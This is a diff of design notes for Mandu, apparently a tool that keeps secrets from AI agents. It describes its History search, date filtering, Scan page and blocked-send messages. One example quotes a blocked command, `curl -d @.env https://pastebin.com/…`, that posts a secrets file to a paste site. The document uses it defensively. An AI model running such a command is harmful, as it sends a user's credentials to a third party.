+file), never its value, and a `$MDU:` token in a name is spelled
+"[masked]" before matching, as the label's are. So a search for a value,
+or a piece of one, still finds nothing; a search for a key's *name* now
+finds the sessions where that key came up, which the label match alone
+never did (*Why the match never reads an original* above still holds for
+the label). Tests: unit `view-model/history-search.test.ts` B1–B6 (a
+secret's name, its file as drawn and in full, a sent and a blocked host,
+every word across listing and names, no facts or a fired leak check finds
+nothing more, never a value or a token, `found` only on a facts hit,
+`sendHosts` beside the launcher line's unchanged `sentHosts`); component
+`history-find-facts.test.ts` H1–H5 (the tour fixture and newer plain
+sessions over the real server: each name finds the tour with `found`, a
+prompt match has none, the oracle, the budget's `through` and the next
+read's exact count, paging, with the switch); jsdom
+`home-js-history-found.test.ts` G1–G4 (the Found line, three then "and N
+more", the capped count and more line, never "No session matches" short of
+the oldest, the hint); stack `tests/stack/history-find-secret.test.ts` (a
+real arbiter at `secrets`, the production adapter, the tour and three
+newer sessions: `STRIPE_KEY`, `staging.conf` and `api.stripe.com` each
+find only the tour with its Found line on the served page, `zzz` none; a
+search for a fake value, a piece of one or `$MDU` finds nothing, and no
+answer or page holds a value or a token).
+
+*Two links open it searched for a file* (2026-11-04, #250): an opened
+rule's *Its sessions on History* on Rules (§4.25f *A rule finds its
+sessions*) and a *Your secrets* card's *Its other sessions* (§4.25b *A card
+finds its other sessions*), each with the path as a card names it (`~/…`),
+or a key's name.
+
+*A blocked send says so, and each name links to its place* (2026-11-03,
+#301). The hosts a search matches include those Mandu stopped a request
+to (`sendHosts` keeps the blocked web steps), and the Found line named
+every one "a send to <host>": after a scare, a search for `pastebin`
+over a session where Mandu blocked `curl -d @.env https://pastebin.com/…`
+read **"Found here: a send to pastebin.com"**, while the session page
+says "Mandu blocked a request to `pastebin.com`". On the one line that
+answers "did my secret go there?", it read as yes. Now a host no send
+went to (not in `kept.sent.names`, `sentHosts`: the sent steps alone,
+the same believed story) is named **"a blocked send to pastebin.com"**
+(`foundBlocked`), and a host both sent to and blocked in one session is
+named once, "a send to" (what reached it matters most). And the line led
+nowhere: to see where `STRIPE_KEY` came up, the person opened the row and
+hunted for the place. Now each name is a link into that session at the
+place it came up, the session page's own landing targets (`?go=`,
+`AGENT_GO`, `landGo`): a secret opens it at *Your secrets*
+(`?go=secrets`, the heading focused), "a send to …" at its sent steps
+(`?go=sent`) and "a blocked send to …" at its blocked steps
+(`?go=blocked`), as the tiles' presses go; with nothing there to go to
+the page stays at its top. "and N more" stays words. The row still opens
+the session at its top; the links are tab stops of their own inside it,
+as "1 question waiting for you" is (`rowClick` leaves a press on a link
+to the link). So `found` on a row is now `{ name, go }[]`
+(`FoundName`, `go` one of `secrets`, `sent`, `blocked`;
+`historyFactsMatch`, `historyFactNames`' new `sent`), where it was
+`string[]`; the page draws an older server's strings, or a `go` it does
+not know, as words, as before. Still names only, never a value: the
+matching, the words that must hold, the look-through and its counts and
+the three names are as above. Tests: unit `history-search.test.ts` B7
+(a blocked-only host, a sent one, one both, a secret's `go`, a fired
+leak check and a value still find nothing); jsdom
+`home-js-history-found.test.ts` G5–G6 (the links and their `?go=`, "and
+N more" and an older server's strings as words; a press lands on Your
+secrets' heading or the blocked step, the row elsewhere opens the top);
+component `history-find-facts.test.ts` H6 (the tour with one more
+request blocked, to `pastebin.com`: "a blocked send to pastebin.com",
+`go` blocked; `api.stripe.com`, sent and blocked, stays a send); stack
+`history-find-secret.test.ts` E4 (the served Found line reads "a blocked
+send to pastebin.com", its link opens the session with its blocked step
+focused, `STRIPE_KEY`'s at Your secrets, no value or token on the
+pages).
+
 *Only the sessions where Mandu stepped in* (2026-10-18). A daily user
 has hundreds of sessions on record, and most are ordinary work where Mandu
 did nothing; the few a person opens History for (a secret masked, a step
@@ -16976,14 +22916,34 @@ already said so. Now a switch sits under the search box, **Only sessions
 where Mandu stepped in** (`#history-only`, a `role="switch"` button in the
 session page's switch look, named by its label). Off, the default, the page
 is as before. On, the list keeps the sessions whose row says Mandu stepped
-in (`steppedIn` in `view-model/home.ts`, pure, read off the row
-`homeAgentRow` builds, so the switch keeps exactly the rows whose counts
-line says something): a secret masked before the AI saw it or read before
-it was marked, an untrusted item masked (a count the row shows only where
-the level masks them), a step blocked, a send with a real value filled
-in, a question still waiting (`rowContext`), or protection failed (the
-leak check's finding, or the listing's verdict for a session that cannot
-be read). The server filters, not the page, because a page of 25 might
+in (`historyFlagged` in `view-model/home.ts`, pure, read off the row
+`homeAgentRow` builds, so the switch keeps the rows whose counts line says
+something, its first mark included): a secret masked before the AI saw it
+or read before it was marked, an untrusted item masked (a count the row
+shows only where the level masks them), a step blocked, a send with a real
+value filled in, a question still waiting (`rowContext`), or protection
+failed (the leak check's finding, or the listing's verdict for a session
+that cannot be read), which is `steppedIn`; or protection was off in it
+(§4.25 *A session that ran with protection off says so*, 2026-10-26; kept
+since 2026-10-30, nightly #183: until then the switch dropped exactly the
+sessions where nothing was guarded, and with nothing else flagged read
+"Mandu has not stepped in in any session on record." over them); or, once
+it ended, a change to a secret file Mandu did not apply (`notApplied`,
+§4.25b *Home and History say so*, 2026-10-31, Shoemaker #266); or one of
+Mandu's protections did not start in it (`lessProtection`, §4.21 *The rows
+say it too*; kept since 2026-11-04, Shoemaker #267: until then the switch
+dropped the sessions that ran less guarded than their person thought,
+though their row was amber for it, the gap #183 had closed for the Off
+ones). `steppedIn` stays the narrower question Home's last-stepped-in line
+asks, so an Off session, a less protected one, or one whose only mark is
+a change not applied, is never named there as one where Mandu stepped in.
+The label, the status line and the empty words stay: the row's amber
+"protection was off" or "less protection than usual" says why it is
+listed. On a computer where one protection never starts (a kernel without
+Landlock, say) every session carries that mark, so there the switch keeps
+every row: honest, as each row is amber already and Home's headline names
+it (#222), but the switch then filters nothing until the computer is
+fixed (`mandu doctor`). The server filters, not the page, because a page of 25 might
 hold none: `GET /api/home/history?only=stepped-in` (any other value is no
 filter) walks the sessions past `after`, counting each as now (`HomeFacts`,
 cached per session), and keeps matches until `limit` rows or
@@ -16993,10 +22953,12 @@ read of a long history stays quick (the cache makes the next ones cheap).
 `next` is the last session looked through, matched or not, so a sparse
 history still pages; the answer adds `only: { through }`, the sessions
 looked through from the newest. `total` still counts every session (with
-`q`, the search's matches: the two filters hold together, the search
-first). With the switch on, the status line under the box reads "Showing
-the sessions where Mandu stepped in" (with a search, ", of 30 sessions
-found"), and Show more, since how many more it will keep is not known
+`q`, until 2026-11-02 the search's matches; since *By a secret or a
+host*, every session it may look through, the two filters holding
+together over one look-through). With the switch on, the status line
+under the box reads "Showing the sessions where Mandu stepped in" (with a
+search, " that match “…”"; until 2026-11-02 ", of 30 sessions found"),
+and Show more, since how many more it will keep is not known
 before every session is read, says how far the look went: "Looked through
 200 of 950 sessions.", or, a read that found none yet, "Mandu has not
 stepped in in the newest 200 of 950 sessions.", never the end while
@@ -17043,7 +23005,10 @@ while a read answers that no session is on record at all (`h.all`, from
 inputs keep their values for Back), and the list's line carries Home's
 *Get started* step: "No session has been recorded yet. Start your agent
 through Mandu, `mandu claude` or `mandu codex`, and it shows up here." (no
-link: that card is the server's, with no anchor). The form is touched only
+link: that card is the server's, with no anchor). Since 2026-10-26 the
+commands are the agents you use (`/api/home`'s `start`, §4.25 *The command
+names the agent you use*): "…through Mandu, `mandu goose`, and it shows up
+here.", and the row is drawn again when a Home answer changes them. The form is touched only
 once a read answered, so it does not blink before the first one; a read
 that failed leaves it as drawn (the record is not known to be empty). The
 History poll that brings the first session (*History follows the poll*)
@@ -17059,6 +23024,95 @@ the anthropic-proxy in production wiring, an empty event store: the served
 `/history` has no form, a session's call and the poll list the row and
 show the form; no value).
 
+*Go to a day* (2026-10-29). Until then History was reachable past its
+first 25 rows only by Show more: "the session from last Tuesday", at ten
+sessions a day, was about three presses a week back, each a read, though
+the rows already sit under day headings (*Sessions sit under their day*).
+*Find a session* helps only when a word of it is remembered. Now a native
+date box sits beside the search, **Go to a day** (`<input type="date">`,
+`#history-day`, labelled, in `#history-search`; under 500 px it wraps
+under the search box). Its latest day is today; it has no earliest,
+since how long sessions are kept is the arbiter's setting
+(`MANDU_EVENT_RETENTION_DAYS`, 0 keeps them all). Choosing a day lists the
+sessions from that day back, newest first, under the same headings, and
+Show more goes on further back as before. *Which moment.* History is
+ordered by each session's last moment, and an ended row sits under the
+day it ended; so the day box cuts on that moment too (`lastTs`, else
+`firstTs`): going to Tue, Oct 20 lists exactly the rows under Oct 20's
+heading and below it in the full list, and the first heading is that day
+or the nearest earlier one with a session. A session that started on
+Oct 20 and ended on Oct 22 is under Oct 22, and is not listed from Oct 20
+back (the queue item asked for the start; its approval holds showed that
+would put later headings above the chosen day). A running session is
+listed under the day it started but ordered by now, so it shows only when
+the day is today. A session with no time is kept, at the list's end. The
+server cuts, not the page: `GET /api/home/history?before=<epoch ms>`,
+the moment the day *after* the chosen one starts as the browser reckons
+it (`historyDayEnd`, `new Date(y, m - 1, d + 1)`, so a 23- or 25-hour
+day ends where it does, never 86 400 000 ms on, and the server needs no
+time zone), keeps the sessions whose moment is before it
+(`historyBefore` in `view-model/home.ts`, pure) before the search, the
+switch and the page cut, so `total`, `next` and Show more count the cut
+list; the answer adds `before: { at, all }` (`all`: every session on
+record, so the page tells "nothing on or before that day" from an empty
+record). An empty, absent or non-numeric `before` is no day
+(`historyBeforeParam`). All three filters hold together. The day lives in
+the address, `/history?day=2026-10-20` (after `q=` and `only=`, replaced,
+not pushed): a reload, Back from a session's page (Back's reads, `historyReadOn`,
+carry `before=` too) and Home's poll (`followHistory`) keep it; a link to
+History starts at the newest, as it starts without a search, and a `day=`
+that is not a real date is none. The status line says where the list
+starts, "From Tuesday, Oct 20 back" ("From yesterday back"; with a search,
+"3 of 214 sessions, from Tuesday, Oct 20 back"; with the switch, its words
+then the same). **Show the newest**, a button beside the box while a day
+is set (not in the status line, a live region whose text `findCount`
+replaces), clears the day, the address and the line and focuses the box,
+as Clear does for the search; clearing the box itself does the same.
+**Day before** and **Day after** (2026-11-04, queue #245), two buttons
+between the box and Show the newest while a day is set, step it one
+calendar day exactly as choosing that day in the box does (`setHistoryDay`:
+the same read, `day=` replaced, the search and the switch kept, the line
+"From Monday, Oct 19 back"), so a busy day need not be scrolled through to
+reach the one before, nor the picker reopened to go a day later. The step
+is in local calendar days (`historyDayStep`, `new Date(y, m - 1, d ± 1)`
+at noon), so a 23- or 25-hour day steps to the next date. Day after is
+hidden on today or later (the box's `max`; a `?day=` typed into the
+future has Day before only). Each is named by its own words then the day
+it goes to, "Day before: Monday, Oct 19", "Day after: today"
+(`historyDayWords`, refreshed on each change; the name starts with what
+it shows, WCAG 2.5.3, as `rowControlName` does). The focus stays on the
+pressed button, as it stays in the box after a choice; when Day after
+reaches today and hides, it moves to Day before, never to the page. An
+empty day keeps both, to step on past it. Under 500 px they wrap with the
+box (`.history-go-day`). Answered earlier's box has no steps yet.
+Nothing on or before the day reads "No session on or before Tuesday, Oct
+20." (with a search, "No session matches “x” on or before …"; with the
+switch, "Mandu has not stepped in in any session on or before …") with
+Show the newest, said to a screen reader by the status line as a search
+that finds none is. The read gate is unchanged: the cut reads the times
+the open route already serves on every row. Tests: unit
+`view-model/history-day.test.ts` (the cut at the bound, the last moment
+as the key, a start-only and an undated session, a non-finite bound,
+`?before=` parsing, the view model's `before`), jsdom
+`home-js-history-day.test.ts` (the box and its label, `before=` the next
+local day's start across a 25-hour day in New York, `day=` replaced in the
+address, the line, Show more and the poll keep it, Show the newest, all
+three filters, the empty lines, `?day=` on load, Back, a link, a bad
+date; Day before and Day after: their names, reads, address and focus,
+hidden with no day, Day after hidden on today and a future day, the steps
+across both of New York's 2026 clock changes, a month and a year), component `history-day.test.ts` (a file source with sessions on
+three days and one across two: the cut, `total`, `next` and Show more past
+the day, with `q` and `only`, a bad `before`), stack
+`tests/stack/history-day.test.ts` (a real arbiter at `secrets`, the
+anthropic-proxy in production wiring, a `.env` read session and one that
+ended a day later: the route cut and the served `/history?day=` list only
+the first under "Yesterday", Day after both under Today and Yesterday,
+Day before the first again, Show the newest both; no value or token).
+Approvals › *Answered earlier* has the same box since 2026-11-04, on the
+same rules (§4.25 *Go to a day on Answered earlier*), and so has *Rule
+changes*, cut on the page over its newest 500 (§4.25 *Go to a day on Rule
+changes*).
+
 *History says what waits for you* (2026-10-16). Until then the History
 route never read the approval queue (`buildHistoryFor` passed
 `buildHistoryViewModel` no `waiting`), so every row had none: a running
@@ -17072,21 +23126,33 @@ words) and both build their rows with `rowContext(panel)`: each pending
 ask counted once, on the session that raised it last (`askedBy`), none
 while the queue is not known, and `masking` for the agent notice. So a
 row's `state` and `waiting` are Home's. The page draws the count in
-Earlier's words, "1 question waiting for you" (the row keeps its prompt,
-as Home's rows do, Running now's since 2026-10-18),
-and a running session that waits gets Running now's amber dot
-(protection failed keeps the red one). The next poll after an answer
+Home's words, "1 question waiting for you" (the row keeps its prompt,
+as Home's rows do, Running now's since 2026-10-18), in the order of the
+session's Home row (2026-10-29): a running row leads with the count,
+right after its marks ("protection failed", the notice marks), as Running
+now does ("1 question waiting for you, 1 secret masked"), where until then
+it came last, after every other count, wrapping to a phone's third line;
+an ended row ends with it, as Earlier does ("1 secret masked, 2 questions
+waiting for you"). So a session's row reads the same on Home and on
+History. A running session that waits also gets Running now's amber dot
+(protection failed keeps the red one). Since 2026-10-27 the count is a
+link to the session at *Needs your OK* (`?go=waiting`, *Agents, not
+sessions*), so an ended session's question that still waits is one press
+away, not a scroll down its page. The next poll after an answer
 draws the row without it. Nothing new is served: the queue and its
 session ids are already open (`/api/egress/approvals`, `/api/home`). Tests:
 unit `view-model/history-waiting.test.ts` (`rowContext`, History's rows,
 Home's and History's rows agree), jsdom `home-js-history-waiting.test.ts`
-(the count, the dots, the poll after an answer), component
+(the count, its order on a running and an ended row, the dots, the poll
+after an answer), `home-js-count-keeps-word.test.ts` K2 (History's running
+and ended rows read as Running now's and Earlier's), component
 `history-waiting.test.ts` (the route over a stub snapshot; an older
 arbiter's queue from the approvals op; no arbiter), stack
 `tests/stack/history-says-waiting.test.ts` (`secrets`; a real arbiter,
 the anthropic-proxy in production wiring, the launcher's real
 `session_exit`, the production approvals adapter, the served page: a
-running and an ended session's questions as Home says them, a Block
+running and an ended session's questions as Home says them and in its
+order, a Block
 over the real route cleared on the poll, no value or token).
 
 *A Show more that fails* (2026-10-15). The product page has two Show more
@@ -17165,12 +23231,22 @@ back, so the block ends with a short list, built by the server as
   key or a password, change it the same way. Open the step to see what it
   was." (with no secret named above it: "… change it where it was issued,
   and turn the old one off. …");
-- always: "This is a fault in Mandu, not in your rules. Report a problem,
-  with this session's time. Never paste the key itself." *Report a
-  problem* links to the issue tracker (`ISSUES_URL`, as the About card's),
+- always: "This is a fault in Mandu, not in your rules. Report it
+  privately to Mandu's maintainers, with this session's time. Do not open a
+  public issue, and never paste the key itself." *Report it privately*
+  links to GitHub's private vulnerability report form
+  (`SECURITY_REPORT_URL`, as the About card's *Report a security problem*),
   in a new tab with `rel="noopener noreferrer"`: a `StoryPart.href`, which
   only the server sets to a fixed address and the page draws only when it
-  is `https:`.
+  is `https:`. Until 2026-10-25 the line said *Report a problem* and linked
+  the public issue tracker (`ISSUES_URL`). But `SECURITY.md` names this
+  exact event (a registered secret reaching a model vendor) as a
+  vulnerability to report privately, never in a public issue, and the bug
+  form makes its reporter tick that the report is not one: a user sent there
+  either ticked a false box or put the session's time, the file and secret
+  names and the host in public before a fix existed. The preview tag's
+  *Report a problem* keeps the tracker (an agent tested less is a bug, not
+  a leak).
 
 It names secrets by their names only, never a value: the names are the
 ones the lines above it already show that viewer (signed out, the same
@@ -17178,7 +23254,8 @@ names the signed-out lines carry), and the check's quote is never read. A
 check that fired falsely still gets the advice: the page cannot tell, and
 changing a key costs less than leaving a leaked one. Tests: unit
 `agent-page-trace.test.ts` (names once and in order, the cap, the unnamed
-line, the report link, no value or token), jsdom
+line, the report link to the private form and never the tracker, no value
+or token), jsdom
 `home-js-history-trace.test.ts` (the list after the lines, the link's
 target and `rel`, a non-`https:` address drawn as words, a clean session
 hides the block), stack `product-history-trace.test.ts` T4 (`secrets`; a
@@ -17193,7 +23270,7 @@ the first `RELEASES_SHOWN` (5), then "and N more": "Mandu released it 3 more
 times after a check: to `api.example.com` at 10:42; in a command at 10:43;
 to `hooks.example.org` at 10:44." `releaseWhere` reads a structured
 `destination`, else the host the masked request names ("… to host"), else
-the boundary ("off this machine", "in a command", "to a file"), else "to a
+the boundary ("off this computer", "in a command", "to a file"), else "to a
 place its record does not name"; releases with no time to the same place
 read once, counted. A time a shown step shows opens it. Never a token: the
 host comes from the AI's own (masked) form.
@@ -17263,7 +23340,10 @@ and across the real arbiter, anthropic-proxy and net-proxy
 read and a send the net-proxy blocks among ordinary reads and a reply;
 `?only=stepped-in` shows exactly those two, three lines count the rest,
 a line's button brings its turns back, off shows all; no value or token on
-the page).
+the page). A secret card's *Show its steps* (§4.25b *A card shows its
+steps*, 2026-10-30) folds by its own reason in the switch's place while it
+is on; the switch ends it, and its *Show every turn* gives the switch's
+folds back.
 
 **Tests.** `test/unit/view-model/agent-page-trace.test.ts` (the finding's
 places, words, step links and cap; the projection drops the quote and keeps
@@ -17305,7 +23385,27 @@ placeholder: `STRIPE_SECRET_KEY`; "a secret" without one):
 - what was masked in what the agent read from the pages, and how many times,
   or that no secret of the person's was on them;
 - each secret the agent typed: filled in on a site it may go to (the site's
-  host), or not typed on a page that may not receive it;
+  host), or not typed, with why in the words of the relay's cause (its
+  notice kinds, devtools-relay.md §3.4; 2026-10-26), one line per cause and
+  site:
+  - **not allowed** (red): "… into evil.example (2 times): Mandu typed
+    nothing, because that site may not receive it.";
+  - **needs your OK** (amber): "… because that site may get it only with
+    your OK. Answer in Approvals.", the last word a link to Approvals;
+  - **you chose to go on without it** (plain, not red: it was the person's
+    *Send without it*): "… because you chose Send without it.";
+  - **could not check** (amber; the gate, the value or the page could not be
+    read, fail-closed): "… because it could not check where the value would
+    go." (the cause only, never the error text);
+  - any other reason (an older relay's): the sentence it always read, "into
+    a page … that site may not receive it".
+
+  The refused event has no page field, so `browserStory` reads the cause
+  from the relay's stored `reason` (`refusalCause`: the fixed prefix, then
+  the cause's fixed words anchored after it) and the host from the
+  not-allowed and needs-your-OK words, kept only if it is a host name
+  (letters, digits, `-`, `.`, an optional port). The view model keeps the
+  cause and the host, never the reason text or its placeholder;
 - a masked value the agent typed that is none of the person's secrets (a
   mistyped or made-up placeholder, the relay's `unknown placeholder`,
   devtools-relay.md §3.2; 2026-10-19), one amber line with its count and no
@@ -17321,9 +23421,13 @@ placeholder: `STRIPE_SECRET_KEY`; "a secret" without one):
 With no turn, the story line under *What happened* says no conversation went
 through Mandu and points to the block. A session without a browser has no
 block. Tests: `test/unit/view-model/browser-story.test.ts` (each line from
-its events, names only, no placeholder anywhere in the data), and
+its events, names only, no placeholder anywhere in the data; each refusal
+cause from the relay's exact words), `test/unit/ui/home-js-agent.test.ts`
+(the refusal lines' words, tones and the Approvals link), and
 `tests/stack/cdp-relay.test.ts` (the relay's events read back from a real
-event store, the story built from them).
+event store, the story built from them; each refusal cause from the real
+relay's words: an unbound page's question, the person's Block and Send
+without it, a gone arbiter).
 
 #### 4.25ag How long Mandu took to start the session (2026-10-21)
 
@@ -17494,14 +23598,22 @@ its inode, size, mtime or ctime changed; *A long scan, in pages* below);
 it is this machine's, like *Where your data lives*, the same for every
 tenant.
 
-- **Home's card** (`HomeVM.scan`, `homeScanCard`; `#home-scan`, under the
-  first-run and warning cards, so under the hero's "secrets masked before
-  the AI saw them"). After a scan it leads with "N of your secrets left this
+- **Home's card** (`HomeVM.scan`, `homeScanCard`; `#home-scan`, after
+  *Approvals waiting*, which is under the first-run and warning cards).
+  Until 2026-10-26 it sat right under those cards, above *Approvals
+  waiting*: on a 390 px phone the tour stack's one waiting question
+  started at y≈840, under the fold, and after a scan the taller card
+  pushed it further down. Urgent first: a question holds an agent, and the
+  card is advice, so the question now comes first. With nothing waiting
+  that block is its one "Nothing is waiting for you." line, so the card
+  moves up by only that (`home-js-home.test.ts`; stack
+  `home-urgent-first.test.ts`, headless Chromium at 390×844). After a scan it leads with "N of your secrets left this
   computer in your agents' requests": the scan's "your secrets" with a
   session not known to have run under Mandu (one only marked by time
   counts). Then why and how to stop it ("Each went to the AI in an agent's
   request to its model provider, in a session without Mandu … start your
-  agent with `mandu claude` (or `mandu codex`)"), when it ran and over how
+  agent with `mandu goose`", the agents you use, §4.25 *The command names
+  the agent you use*), when it ran and over how
   many sessions, the first three by name and file with how they got there
   (each whose file is `~/…` or absolute with *Change it in Rules* on its
   own line under it, `HomeScanTop.ruleFile`, as on the Scan page below),
@@ -17519,6 +23631,38 @@ tenant.
   "With Mandu": … → "masked by Mandu" → … → "got only the mask", green);
   after the top findings, the green line; the sends worth a look in red
   with a mark.
+
+  *An empty list of top secrets is not drawn* (2026-10-29). Before any scan
+  and after one where nothing left, `top` is empty, but the `<ul>` kept its
+  8 px margin, so the next line sat 14 px under the sentence where the
+  card's other lines have 6 (headless Chromium, 1280 and 390 px).
+  `.scan-top:empty` is `display: none`, the file's `:empty` idiom (unit
+  `css-empty-slots.test.ts`; stack `empty-slots-gap.test.ts`).
+
+  *A card with nothing to act on folds* (2026-10-29). Until then the card
+  never went away: a person told "None of your secrets left this computer"
+  read the same card on every visit, weeks later, and one who chose not to
+  scan read the prompt every time. Now two cards have a *Fold* button
+  beside *See the whole scan →*: the prompt before any scan, and a clean
+  result (`tone: "ok"`) with no send worth a look and no rule waiting.
+  Folded, the card is one line in its place: "✓ Last scan, 21 Oct: none of
+  your secrets left this computer." linked to the Scan page, or before a
+  scan the question's own words with no mark (never a result), each with
+  *Show*, which opens it and gives its heading the focus (Fold gives it to
+  Show). The server says which cards fold and the line's words
+  (`HomeScanCard.folded`, null for every other card), as it says the tone;
+  the page reads no words. The fold is kept in this browser
+  (`mandu.home.scanFolded`) under the scan it was made on
+  (`HomeScanCard.ranAt`, the record's; `none` before a scan), so a new scan
+  opens the card again whatever it found; where storage is refused it
+  holds for the page. A card that says secrets left (`bad`), that could not
+  read everything (`warn`), or a green one with a send worth a look or a
+  rule waiting never folds: no button, and a fold kept for another scan
+  does not apply. Those are the cards that ask something of the person.
+  The Scan page stays in the top bar either way. Display only
+  (`last-scan.test.ts`, `home-js-scan.test.ts`; stack
+  `transcript-scan-kept.test.ts`: `/api/home`'s `ranAt` is the kept
+  record's, and its card with secrets left has `folded` null).
 - **The Scan page** (`/scan`, `GET /api/scan` → `scanHead(scanPageVM)`, open in the
   read gate: names, files, masks, hosts, counts and commands the AI already
   saw, never a value). Its headline is the card's. Then what the scan read
@@ -17532,9 +23676,31 @@ tenant.
   (worth a look)* first, then *to the key's own service* (each titled by
   its host, its story naming the URLs there as the scan masked them, each
   as code, and the filter matching them; 2026-10-22); *Riskier
-  sessions*; the rules waiting; how to stop it; *Run it again*. Each section
+  sessions*; the rules waiting; how to stop it ("To keep your secrets from
+  the AI from now on, start your agent with `mandu goose`.", the agents you
+  use, as Home names them: *The Scan page names the agent you use* below);
+  *Run it again*. Each section
   shows 25 rows and *Show N more*, read a page at a time (*A long scan, in
   pages*).
+- **The Scan page names the agent you use** (2026-10-29). The page named
+  its start commands from the kept scan alone, so with no scan kept it told
+  a Goose user, whom Home told `mandu goose`, to start `mandu claude` (or
+  `mandu codex`), and after a scan of old Claude Code sessions someone who
+  now runs `mandu opencode` read only `mandu claude`. The page is still
+  built once per kept file (`scan-routes.ts` `LastScanCache.page`), and the
+  recorded sessions are not in that file, so the build tags its start
+  commands instead: `startCommandParts(cmds, true)` marks each part it makes,
+  the codes and the " (or " / ")" between them, `start: true`, in the stop
+  line (`scanPageVM`) and in the summary after a scan (`homeScanCard` given
+  no `start`; Home's card, given its list, stays untagged). home.js
+  (`withStart`) draws each run of tagged parts from `/api/home`'s `start` in
+  the page's own form, "`a`" or "`a` (or `b`)"; with no Home answer yet, or
+  an older server that sends no `start`, the parts as sent, today's words.
+  A Home answer that arrives after `/api/scan`, or a poll that brings
+  another list, draws those two sentences again and nothing else
+  (`drawScanStart`, compared by `sameAsDrawn`), so an open fold, *Find one*
+  and the place stay. Command words only: no session, file or host enters
+  the line.
 - **A long scan, in pages** (2026-10-22). On the maintainer's machine (834
   sessions, a 1.3 MB kept scan of 918 findings) `/api/scan` was the whole
   page in one 3.2 MB answer, and the server parsed the file and built all
@@ -17561,7 +23727,20 @@ tenant.
   150 ms after the last key: the query covers the whole section, rows the
   head never sent, without sending every row's filter words (about 630 kB of
   the 3.2 MB) to the page; an older answer never draws over a newer one,
-  and clearing the box draws the head's rows again without a read. A part
+  and clearing the box draws the head's rows again without a read. Under
+  the box a status line (`role="status"`, the box's `aria-describedby`;
+  2026-10-29) says what the find found, in History's words: "12 of 340
+  values match “stripe”." ("1 of 340 values matches …"; each row of the
+  three filtered sections is one value, another section would say rows),
+  from the answer's `total` and the section's, numbers as the heading
+  writes them, the query as typed and trimmed, as text, cut to 60
+  characters with "…". None found: "No value of 340 matches “stripe”.",
+  for a screen reader only (the list shows "None matches."), as History's
+  and Approvals' finds do (§4.25ae *None found is said*). It is written
+  only when its words change, so *Show N more* under the same query and a
+  redraw of the same answer say nothing again; a cleared box, and a find
+  whose read failed (its "The matching rows could not be read. …" line
+  stays), hide it, so no stale count stands beside a failure. A part
   that cannot be read says why under the rows or in the fold ("The next
   rows could not be read. …", "The examples could not be read. …"), and
   the next press or opening tries again. On the maintainer's record the
@@ -17571,7 +23750,9 @@ tenant.
   page from the click to its sections drawn 111 to 198 ms became 20 to
   30 ms in a local headless Chromium. Not gzipped: the scan names your
   secrets' files and keys, so it stays plain like `/api/secrets`
-  (§4.30 *Compression, per route*).
+  (§4.30 *Compression, per route*). Back to the page reads the pages a
+  section had drawn again, a page at a time, and reopens what you had open
+  (§4.25 *Back and Forward keep your place*, *Scan*).
 - **"Could not reach its own server"** (2026-10-22). The page says it when
   its read got no answer or an answer it could not read (`readFailure`
   `gone`: the fetch rejected, or `res.json()` threw on a body cut short).
@@ -17584,6 +23765,83 @@ tenant.
   page until a refresh. Now the answer is small, and a Scan page whose
   read failed reads again once a Home poll answers (`SC.unread`, every
   10 s while the tab is shown and on a return to it).
+- **The Scan page follows a new scan** (2026-10-26). The page tells you to
+  run `mandu scan`, but read `/api/scan` only when opened and after a failed
+  read: with no scan kept the server still answers 200 (the way to run
+  one), so after the scan Home's card showed "3 of your secrets left this
+  computer…" while the Scan page in the same tab kept "Run it in a
+  terminal: `mandu scan`", and a second scan's page kept the old findings
+  until a *Show more* got a 409. Now Home's card carries the kept scan's
+  `rev` (`HomeScanCard.rev`, from `LastScanCache.keptRev()` through
+  `HomeDeps.lastScanRev`): the value `/api/scan`'s head sends, a hash of
+  the file's identity, never the path, and `null` with none kept, as the
+  head says it. On each Home poll (every 10 s while the tab is shown, and
+  on a return to it) the Scan page, shown with no read out and its last
+  read not failed, reads its head again when the card's `rev` differs from
+  the one it drew and from one it already followed (`scanFollows`): a scan
+  kept since, "none" to "one" included, shows at the next poll without a
+  reload. A head of the same scan (a poll that raced the read) draws
+  nothing; another is drawn at the place you were (`scrollY` kept, never
+  a jump to the top), and a polite status line under the head says "A
+  new scan finished. This page shows it." once (`#scan-followed`,
+  `role="status"`; not a toast; opening the page again clears it). A
+  follow whose read fails keeps the page drawn, and the next poll tries
+  again. While the kept scan is the same nothing is read or drawn, so an
+  open fold, the *Find one* text and the scroll stay. A card without `rev`
+  (an older server) reads nothing new, as before. Display only: no new
+  route, `/api/scan` unchanged, and the extra cost per poll is one hash of
+  the file's short identity key, over the `stat` `LastScanCache` already
+  made.
+  Tests: `home-js-scan.test.ts` (jsdom), `scan-cache.test.ts` and
+  `home-not-running.test.ts` (the card's `rev` is the head's), and the
+  stack test `scan-page-follows.test.ts` (a real DashboardServer and
+  arbiter, the served page in jsdom: none, then one, then another scan
+  followed with no navigation; no value or token in any answer or the
+  page).
+- **Before any scan, the step comes first** (2026-10-26). With no scan
+  kept the page took Home's card's words in Home's order: under the
+  sentence about 100 px of nothing (the empty `#scan-sections` still took
+  its place in the page's column, two 32 px gaps), then the "from now on"
+  line, then, last and in the dim note style, "Run it in a terminal:
+  `mandu scan`", the one thing the page asks for. Now, while `ran` is
+  false, `#scan-end` draws the step first at body size (`#scan-step`: the
+  page's `againParts`, with its Copy, §4.25b), then one note
+  (`ScanPageVM.stepNote`, `#scan-step-note`): "This page shows what it
+  found when it finishes." (true since *The Scan page follows a new scan*
+  above), then the "from now on" line (`stopParts`) as the second thing to
+  do. `#scan-sections` is hidden while it holds no section, so the step
+  sits one block gap (32 px) under the sentence. After a scan `stepNote`
+  is null and the page draws as before, *Run it again: `mandu scan`*
+  closing it under the findings; a failed read shows neither line. Home's
+  card keeps its own order (`HomeScanCard` has no `stepNote`). Tests:
+  `last-scan.test.ts`, `home-js-scan.test.ts` (jsdom), `scan-pages.test.ts`
+  (a real DashboardServer, before and after a scan is kept) and the stack
+  test `scan-page-first-step.test.ts` (headless Chromium at 1280 px: the
+  step within 40 px of the sentence, above the "from now on" line).
+- **A Scan page that cannot be read says only that** (2026-10-29). A page
+  drawn once and opened again (from Home's card, the top bar or Back)
+  while `GET /api/scan` failed (the service or the dashboard stopped, or
+  an error answer) wrote the failure into `#scan-sentence` and hid the
+  findings, but left the rest of the last read: `#page-scan`'s
+  `data-tone`, so the plain headline "What your agents already sent to
+  the AI" was drawn red or green over the error, and `#scan-end`'s lines,
+  "1 file that holds them has no rule yet … Review them" (about secrets
+  the page no longer shows), the "from now on" line and *Run it again*.
+  Now a failed read draws only what is true: the plain headline with no
+  tone and no mark, and the failure sentence ("The last scan could not be
+  read. …"). `#scan-end` is hidden and its three lines are emptied, so no
